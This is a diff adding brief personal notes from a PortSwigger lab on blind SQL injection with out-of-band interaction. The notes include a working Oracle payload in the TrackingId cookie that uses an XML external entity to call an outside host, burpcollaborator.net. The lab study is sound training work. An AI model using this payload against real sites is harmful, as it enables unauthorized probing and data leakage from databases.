@@ -1,0 +1,8 @@
+Cookie has tracking ID and session ID
+Lab says work with the tracking ID
+Don't have the full version of burp so can't make a burp collaborator sub ID
+Important thing to note is use UNION 
+Using 
+TrackingId= ' SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://burpcollaborator.net/"> %remote;]>'),'/l') FROM dual --
+without a subdomain solved the Lab
+Simply used the Oracle dns in the cheat sheet https://portswigger.net/web-security/sql-injection/cheat-sheet
